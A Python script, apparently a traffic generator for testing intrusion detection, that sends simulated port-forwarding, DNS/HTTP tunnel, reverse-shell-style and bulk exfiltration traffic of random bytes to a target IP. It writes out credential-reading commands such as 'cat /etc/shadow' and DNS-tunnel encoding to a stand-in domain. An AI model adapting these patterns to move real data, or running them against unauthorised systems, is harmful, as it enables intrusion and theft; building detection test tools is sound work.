#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
渗透攻击脚本（4种攻击方式）
============================

包含：端口转发、隧道通信、后门通信、数据外泄

用法：
  python infiltration.py --target <IP> --attack <port_fwd|tunnel|backdoor|exfil|all>

⚠️ 仅用于授权测试环境，禁止用于未授权目标！

御链天鉴开发团队
"""

import argparse
import random
import socket
import time
import threading
import struct
import base64
import sys
from config import TARGET_IP, ATTACK_DURATION
from scapy.all import IP, TCP, UDP, DNS, DNSQR, Raw, send, sr1, RandShort, conf

conf.verb = 0


# ========== 1. 端口转发模拟 ==========
def port_forwarding(target, port=443, duration=60, interval=2):
    """
    端口转发模拟：建立持久TCP隧道，周期性转发数据
    特征：长时间TCP连接，周期性双向小数据包，非标准端口使用
    """
    print(f"[端口转发] 目标={target}:{port}, 持续={duration}s, 间隔={interval}s")
    end_time = time.time() + duration
    count = 0

    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((target, port))
            # 模拟隧道握手
            s.send(b"\x05\x01\x00")  # SOCKS5-like handshake
            conn_end = min(time.time() + 30, end_time)
            while time.time() < conn_end:
                # 模拟转发数据（随机小负载）
                data_size = random.randint(16, 256)
                s.send(bytes(random.getrandbits(8) for _ in range(data_size)))
                count += 1
                time.sleep(interval + random.uniform(-0.5, 0.5))
            s.close()
        except Exception:
            time.sleep(1)

    print(f"[端口转发] 完成，共转发 {count} 个数据块")


# ========== 2. 隧道通信 ==========
def tunnel_communication(target, duration=60, interval=3):
    """
    隧道通信模拟：通过DNS/ICMP/HTTP隧道传输数据
    特征：DNS查询中嵌入编码数据、异常长度DNS请求、高频DNS查询
    """
    print(f"[隧道通信] 目标={target}, 持续={duration}s")
    end_time = time.time() + duration
    count = 0

    # DNS隧道：将数据编码到DNS查询域名中
    def dns_tunnel_send(data):
        encoded = base64.b32encode(data).decode().rstrip("=").lower()
        # 分割成DNS标签（每段最长63字符）
        labels = [encoded[i:i+60] for i in range(0, len(encoded), 60)]
        domain = ".".join(labels) + ".tunnel.example.com"
        pkt = IP(dst=target) / UDP(sport=RandShort(), dport=53) / DNS(
            rd=1, qd=DNSQR(qname=domain, qtype="TXT")
        )
        send(pkt)

    # HTTP隧道：将数据编码到HTTP请求中
    def http_tunnel_send(data):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target, 80))
            encoded = base64.b64encode(data).decode()
            req = (
                f"GET /api/check?token={encoded} HTTP/1.1\r\n"
                f"Host: {target}\r\n"
                f"X-Session-Data: {encoded}\r\n"
                f"Cookie: session={encoded}\r\n"
                f"Connection: close\r\n\r\n"
            )
            s.send(req.encode())
            s.close()
        except Exception:
            pass

    while time.time() < end_time:
        # 生成随机"机密数据"
        secret_data = bytes(random.getrandbits(8) for _ in range(random.randint(32, 128)))

        method = random.choice(["dns", "http"])
        if method == "dns":
            dns_tunnel_send(secret_data)
        else:
            http_tunnel_send(secret_data)

        count += 1
        time.sleep(interval + random.uniform(-1, 1))

    print(f"[隧道通信] 完成，共传输 {count} 个隧道数据块")


# ========== 3. 后门通信 ==========
def backdoor_communication(target, port=4444, duration=60, interval=5):
    """
    后门通信模拟：模拟反向Shell/C2通道
    特征：到非标准端口的TCP长连接，周期性命令-响应模式
    """
    print(f"[后门通信] 目标={target}:{port}, 持续={duration}s")

    commands = [
        b"whoami\n", b"id\n", b"uname -a\n", b"pwd\n", b"ls -la\n",
        b"cat /etc/passwd\n", b"netstat -tlnp\n", b"ps aux\n",
        b"ifconfig\n", b"cat /etc/shadow\n", b"find / -perm -4000\n",
        b"env\n", b"history\n", b"crontab -l\n", b"w\n",
    ]
    responses = [
        b"root\n", b"uid=0(root) gid=0(root)\n",
        b"Linux server 5.15.0-76-generic #83-Ubuntu SMP\n",
        b"/root\n", b"total 24\ndrwxr-xr-x 3 root root 4096\n",
    ]

    end_time = time.time() + duration
    count = 0

    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((target, port))
            conn_end = min(time.time() + 20, end_time)
            while time.time() < conn_end:
                cmd = random.choice(commands)
                s.send(cmd)
                time.sleep(0.5)
                resp = random.choice(responses)
                s.send(resp)
                count += 1
                time.sleep(interval + random.uniform(-1, 2))
            s.close()
        except Exception:
            time.sleep(2)

    print(f"[后门通信] 完成，共执行 {count} 个命令-响应交互")


# ========== 4. 数据外泄 ==========
def data_exfiltration(target, port=443, duration=60, chunk_size=4096):
    """
    数据外泄模拟：模拟大量敏感数据通过网络传出
    特征：大量出站数据，持续上传流量，数据量远超正常
    """
    print(f"[数据外泄] 目标={target}:{port}, 持续={duration}s, 块大小={chunk_size}")
    end_time = time.time() + duration
    total_bytes = 0

    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((target, port))

            # 模拟HTTPS伪装
            s.send(b"\x16\x03\x01\x00\x05\x01\x00\x00\x01\x00")  # TLS ClientHello-like

            conn_end = min(time.time() + 15, end_time)
            while time.time() < conn_end:
                # 生成"敏感数据"并传输
                data = bytes(random.getrandbits(8) for _ in range(chunk_size))
                # 用base64编码模拟加密外泄
                encoded = base64.b64encode(data)
                s.send(encoded)
                total_bytes += len(encoded)
                time.sleep(random.uniform(0.1, 0.5))
            s.close()
        except Exception:
            time.sleep(1)

    mb = total_bytes / (1024 * 1024)
    print(f"[数据外泄] 完成，共外泄 {mb:.2f} MB 数据")


# ========== 主入口 ==========
ATTACK_MAP = {
    "port_fwd": ("端口转发攻击", port_forwarding),
    "tunnel": ("隧道通信攻击", tunnel_communication),
    "backdoor": ("后门通信攻击", backdoor_communication),
    "exfil": ("数据外泄攻击", data_exfiltration),
}

def main():
    parser = argparse.ArgumentParser(description="渗透攻击工具 - 御链天鉴")
    parser.add_argument("--target", "-t", default=TARGET_IP, help=f"目标IP地址 (默认: {TARGET_IP})")
    parser.add_argument("--attack", "-a", default="tunnel",
                        choices=list(ATTACK_MAP.keys()) + ["all"], help="攻击类型")
    parser.add_argument("--port", "-p", type=int, default=443, help="目标端口")
    parser.add_argument("--duration", "-d", type=int, default=60, help="持续时间(秒)")
    args = parser.parse_args()

    print(f"{'='*60}")
    print(f"渗透攻击工具 - 御链天鉴")
    print(f"目标: {args.target}:{args.port}")
    print(f"持续: {args.duration}s")
    print(f"{'='*60}")

    if args.attack == "all":
        for key, (name, func) in ATTACK_MAP.items():
            print(f"\n--- {name} ---")
            if key == "tunnel":
                func(args.target, duration=min(args.duration, 30))
            else:
                func(args.target, port=args.port, duration=min(args.duration, 30))
            time.sleep(2)
    else:
        name, func = ATTACK_MAP[args.attack]
        print(f"\n--- {name} ---")
        if args.attack == "tunnel":
            func(args.target, duration=args.duration)
        else:
            func(args.target, port=args.port, duration=args.duration)

    print(f"\n{'='*60}")
    print("攻击完成")


if __name__ == "__main__":
    main()
